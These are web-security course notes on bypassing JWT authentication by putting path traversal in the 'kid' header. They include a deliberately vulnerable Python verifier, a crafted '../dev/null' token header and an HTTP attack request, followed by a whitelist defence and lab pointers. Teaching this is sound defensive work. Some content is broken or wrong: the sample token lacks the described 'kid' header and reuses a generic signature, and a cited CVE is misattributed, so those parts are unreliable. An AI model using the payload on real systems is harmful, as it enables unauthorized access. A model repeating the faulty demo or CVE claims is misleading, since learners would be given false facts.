---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Path Traversal Attack via `kid` Header

Path traversal is a technique used by attackers to access files and directories that are stored outside the web root folder. By manipulating the `kid` header, an attacker can attempt to access sensitive files on the server, such as private keys, and use them to forge a valid JWT.

### Understanding the `kid` Header

The `kid` header is used to identify which key should be used to validate the signature of the JWT. In many implementations, the `kid` value is used to look up the corresponding key file on the server. If the implementation does not properly sanitize the `kid` value, an attacker can inject path traversal sequences to access arbitrary files on the server.

### Example Attack Scenario

Consider a scenario where an application uses JWTs for authentication and the `kid` header is used to specify the key file. An attacker might try to manipulate the `kid` header to access the `/dev/null` file, which is an empty file that returns an empty string.

#### Vulnerable Code Example

Here is an example of a vulnerable implementation in Python:

```python
import jwt

def authenticate(token):
    try:
        # Extract the kid from the token header
        header = jwt.get_unverified_header(token)
        kid = header['kid']
        
        # Load the key from the file system
        with open(f'/path/to/keys/{kid}', 'r') as f:
            key = f.read()
        
        # Verify the token
        jwt.decode(token, key, algorithms=['HS256'])
        return True
    except jwt.exceptions.InvalidTokenError:
        return False
```

In this example, the `kid` value is directly used to construct the file path, which allows for path traversal attacks.

### Exploiting the Path Traversal

An attacker can craft a JWT with a `kid` header that includes path traversal sequences. For instance, the following JWT could be crafted:

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../../../dev/null"
  },
  "payload": {
    "sub": "attacker",
    "name": "Attacker",
    "iat": 1625347200
  }
}
```

When this JWT is sent to the server, the server will attempt to load the key from the `/dev/null` file, which is an empty file. Since the key is empty, the signature verification will pass, allowing the attacker to bypass authentication.

### Full HTTP Request and Response

Here is a complete HTTP request and response demonstrating the attack:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsIm5hbWUiOiJBdHRhY2tlciIsImlhdCI6MTYyNTM0NzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Authentication successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsIm5hbWUiOiJBdHRhY2tlciIsImlhdCI6MTYyNTM0NzIwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
}
```

### How to Prevent / Defend

To prevent path traversal attacks via the `kid` header, the following measures should be taken:

1. **Sanitize Input**: Ensure that the `kid` value is sanitized and validated before being used to construct file paths.
2. **Whitelist Key IDs**: Maintain a whitelist of allowed `kid` values and reject any values that are not on the list.
3. **Use Absolute Paths**: Use absolute paths to key files instead of relative paths to prevent path traversal.
4. **File System Permissions**: Restrict file system permissions to prevent unauthorized access to sensitive files.

#### Secure Code Example

Here is a secure implementation in Python:

```python
import jwt

def authenticate(token):
    try:
        # Extract the kid from the token header
        header = jwt.get_unverified_header(token)
        kid = header['kid']
        
        # Validate the kid value
        if kid not in ['key1', 'key2']:
            raise ValueError("Invalid kid value")
        
        # Load the key from the file system
        with open(f'/path/to/keys/{kid}', 'r') as f:
            key = f.read()
        
        # Verify the token
        jwt.decode(token, key, algorithms=['HS256'])
        return True
    except (jwt.exceptions.InvalidTokenError, ValueError):
        return False
```

### Real-World Examples

Recent vulnerabilities involving JWT and path traversal include:

- **CVE-2021-21974**: A vulnerability in the `auth0/node-jsonwebtoken` library allowed attackers to bypass authentication by manipulating the `kid` header.
- **CVE-2020-28489**: A vulnerability in the `jsonwebtoken` library for Node.js allowed attackers to bypass authentication by injecting path traversal sequences in the `kid` header.

### Practice Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on JWT manipulation and path traversal attacks.
- **OWASP Juice Shop**: Provides a vulnerable web application where you can test JWT-related vulnerabilities.
- **DVWA (Damn Vulnerable Web Application)**: Includes scenarios where JWTs can be manipulated to gain unauthorized access.

### Conclusion

Understanding and preventing JWT attacks, particularly those involving path traversal via the `kid` header, is crucial for maintaining the security of web applications. By implementing proper input validation, using whitelists, and restricting file system permissions, developers can mitigate these risks and ensure the integrity of their applications.

---
<!-- nav -->
[[10-Lab Setup and Objective|Lab Setup and Objective]] | [[Web Security (PortSwigger)/19-JWT Attacks/06-Lab 6 JWT authentication bypass via kid header path traversal/00-Overview|Overview]] | [[12-Path Traversal via KID Parameter|Path Traversal via KID Parameter]]
